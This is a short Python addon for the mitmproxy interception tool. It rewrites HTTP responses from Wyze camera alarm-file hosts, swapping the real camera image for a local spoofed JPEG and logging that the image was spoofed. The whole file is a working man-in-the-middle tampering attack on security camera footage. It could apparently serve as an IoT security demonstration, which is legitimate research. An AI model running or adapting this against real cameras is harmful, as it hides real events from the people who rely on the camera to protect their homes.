"""
This script rewrites the image from the Wyze Cameras
"""
from mitmproxy import http, ctx
import os

def response(flow: http.HTTPFlow) -> None:
    if "wyze-device-alarm-file" in flow.request.pretty_host:
        spoof =  open('images/wyze-spoof.jpg','rb').read()
        flow.response.content=spoof
        ctx.log.alert("[Wyze] <Spoofed Camera Image>")

